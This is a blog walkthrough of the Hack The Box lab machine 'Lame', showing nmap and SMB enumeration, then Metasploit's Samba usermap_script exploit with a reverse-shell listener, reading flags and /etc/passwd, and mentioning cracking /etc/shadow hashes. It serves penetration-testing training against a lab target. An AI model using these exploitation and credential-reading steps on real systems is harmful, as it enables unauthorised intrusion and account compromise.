<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Introduction Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.
Target IP: 10.129.79.228
Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="//localhost:1313/posts/2024/lame-machine-htb/" />


    <title>
        
            Lame machine HTB :: d0natell0&#39;s Blog 
        
    </title>





<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Lame machine HTB">
  <meta itemprop="description" content="Introduction Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.
Target IP: 10.129.79.228
Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:">
  <meta itemprop="datePublished" content="2024-07-17T22:42:00+03:00">
  <meta itemprop="dateModified" content="2024-07-17T22:42:00+03:00">
  <meta itemprop="wordCount" content="699">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Lame machine HTB">
  <meta name="twitter:description" content="Introduction Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.
Target IP: 10.129.79.228
Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:">







    <meta property="article:published_time" content="2024-07-17 22:42:00 &#43;0300 &#43;0300" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="//localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                D0natell0&#39;s Blog</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#1BDA5E;
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/news">News</a></li><li><a href="/posts">Posts</a></li><li><a href="/pentesting-tools">Tools</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        4 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="//localhost:1313/posts/2024/lame-machine-htb/">Lame machine HTB</a>
      </h1>

      

      
        <figure class="post-cover">
          <img src="//localhost:1313/lame-machine-img/Lame.png" alt="Lame machine HTB" />
          
          
        </figure>
      

      

      <div class="post-content">
        <hr>
<h3 id="introduction">Introduction</h3>
<p>Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.</p>
<hr>
<p><strong>Target IP:</strong> 10.129.79.228</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<blockquote>
<p>Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.</p>
</blockquote>
<hr>
<h3 id="initial-nmap-scan">Initial Nmap Scan</h3>
<p>We start with a comprehensive Nmap scan to discover open ports and services:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sV -p- --open --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.79.228 -v -oN first_scan
</span></span></code></pre></div><p><strong>Let&rsquo;s break down this command</strong></p>
<p>sudo: Run Nmap with root privileges</p>
<ul>
<li>-sV: Probe open ports to determine service/version info</li>
<li>-p-: Scan all ports</li>
<li>&ndash;open: Only show open (or possibly open) ports</li>
<li>&ndash;min-rate 5000: Send packets no slower than 5000 per second</li>
<li>-n: No DNS resolution</li>
<li>-Pn: Treat all hosts as online &ndash; skip host discovery</li>
<li>-v: Verbose output</li>
<li>-oN first_scan: Output in normal format to file &lsquo;first_scan&rsquo;</li>
</ul>
<hr>
<p><em>Results:</em></p>
<ul>
<li>Port 21: FTP (vsftpd 2.3.4)</li>
<li>Port 22: SSH (OpenSSH 4.7p1 Debian 8ubuntu1)</li>
<li>Port 139: Samba smbd 3.X - 4.X</li>
<li>Port 445: Samba smbd 3.X - 4.X</li>
</ul>
<p>OS: Unix/Linux</p>
<hr>
<blockquote>
<p>This scan gives us an overview of the services running on the target machine, helping us focus our further enumeration efforts.</p>
</blockquote>
<hr>
<h3 id="further-enumeration-ftp-port-21">Further Enumeration FTP (Port 21)</h3>
<p>We perform a more detailed scan of the FTP service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo nmap -sVC -p21 10.129.79.228 -v -oN script_scan_port_21
</span></span></code></pre></div><p>This command uses -sVC to run default scripts (-sC) and version scanning (-sV) on port 21.</p>
<hr>
<p><strong>Findings:</strong></p>
<ul>
<li>Anonymous FTP login allowed</li>
<li>ASCII type</li>
<li>Plain text connections</li>
</ul>
<p>These findings suggest that the FTP server might be vulnerable to anonymous access. Let&rsquo;s try to connect:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp anonymous@10.129.79.228
</span></span></code></pre></div><p><em>Result:</em> Successfully logged in, but no interesting files found.</p>
<hr>
<h3 id="samba-port-139">Samba (Port 139)</h3>
<p>Next, we focus on the Samba service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sVC -p139 10.129.79.228 -v -oN script_scan_port_139
</span></span></code></pre></div><p><strong>Findings:</strong></p>
<ul>
<li>OS: Unix (Samba 3.0.20-Debian)</li>
<li>Computer name: lame</li>
<li>Domain name: hackthebox.gr</li>
<li>FQDN: lame.hackthebox.gr</li>
</ul>
<p>This information helps us understand the target environment better.</p>
<hr>
<h3 id="smb-enumeration">SMB Enumeration</h3>
<p>We use smbclient to list available shares:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -N -L //10.129.79.228/
</span></span></code></pre></div><blockquote>
<p>smbclient is a tool for accessing SMB/CIFS resources on servers. The -N option suppresses the password prompt, and -L lists the available shares.</p>
</blockquote>
<hr>
<p><strong>Discovered shares:</strong></p>
<ul>
<li>print$</li>
<li>tmp</li>
<li>opt</li>
<li>IPC$</li>
<li>ADMIN$</li>
</ul>
<p>We then attempt to access the &rsquo;tmp&rsquo; share:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -N //10.129.79.228/tmp
</span></span></code></pre></div><p>While we found some files, nothing immediately useful for exploitation was discovered.</p>
<hr>
<h3 id="2-vulnerability-identification">2. Vulnerability Identification</h3>
<p>After researching the versions of services found, particularly Samba 3.0.20, we identified a potential exploit:</p>
<p>Samba &ldquo;username map script&rdquo; Command Execution</p>
<p>This vulnerability allows for remote command execution, which could give us a foothold on the system.</p>
<hr>
<h3 id="3-exploitation">3. Exploitation</h3>
<p><strong>Using Metasploit</strong></p>
<p>Metasploit is a powerful penetration testing framework that provides a collection of exploits and auxiliary tools.</p>
<p>Start Metasploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfconsole
</span></span></code></pre></div><hr>
<p><strong>Search for the Samba exploit:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; search samba
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/1.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />


<hr>
<p><strong>Select and configure the exploit:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; use exploit/multi/samba/usermap_script
</span></span><span style="display:flex;"><span>msfconsole&gt; set RHOSTS 10.129.79.228
</span></span><span style="display:flex;"><span>msfconsole&gt; set LHOST <span style="color:#f92672">[</span>Your IP<span style="color:#f92672">]</span>
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/2.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />


<p>Here, we&rsquo;re setting up the exploit with our target IP (RHOSTS) and our own IP (LHOST) for the reverse shell connection.</p>
<hr>
<p>Run the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; run
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/3.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />


<hr>
<h3 id="4-post-exploitation">4. Post-Exploitation</h3>
<p>Once we have access to the system, our goal is to find and extract valuable information, such as flags in a CTF scenario.</p>
<p><strong>Obtaining Root Flag</strong></p>
<p>Navigate to root directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd root
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/4.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />


<hr>
<p><strong>Cat the root flag:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat root.txt
</span></span></code></pre></div><hr>
<p><strong>Obtaining User Flag</strong></p>
<p><em>Identify users:</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
</span></span></code></pre></div><blockquote>
<p>This file contains user account information.</p>
</blockquote>
<p>
    <img src="../../../lame-machine-img/5.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />



    <img src="../../../lame-machine-img/6.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />

</p>
<hr>
<p>Switch to user &lsquo;makis&rsquo;:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su makis
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/7.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />


<hr>
<p>Navigate to makis&rsquo;s home directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd 
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/8.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />


<hr>
<p>Cat the user flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
</span></span></code></pre></div>
    <img src="../../../lame-machine-img/9.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />


<hr>
<h3 id="conclusion">Conclusion</h3>
<p>In this walkthrough, we successfully compromised the Lame machine by exploiting an outdated Samba version. We used various tools and techniques common in penetration testing:</p>
<ul>
<li>Nmap for initial reconnaissance and service enumeration</li>
<li>smbclient for SMB share exploration</li>
<li>Metasploit for exploit delivery</li>
</ul>
<hr>
<h3 id="additional-notes">Additional Notes</h3>
<p>We found an id_dsa key in makis&rsquo;s .ssh directory but couldn&rsquo;t use it due to outdated key types.</p>
<p>This highlights the importance of keeping SSH configurations up-to-date.</p>
<p>Creating a new SSH key as root wasn&rsquo;t feasible without makis&rsquo;s password, demonstrating proper user privilege separation.</p>
<p>While it&rsquo;s possible to crack makis&rsquo;s password hash from /etc/shadow, it wasn&rsquo;t necessary for this challenge. However, in a real-world scenario, this could be a potential avenue for further exploitation.</p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        699 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2024-07-17 16:42
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="//localhost:1313/posts/2024/green-horn-machine/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Green Horn Machine</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="//localhost:1313/posts/2024/nibbles-machine-htb/">
                    <span class="button__text">Nibbles Machine HTB</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="//localhost:1313/"></a></span>
            <span></span>
            <span><a href="//localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by d0natell0</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>




    </body>
</html>
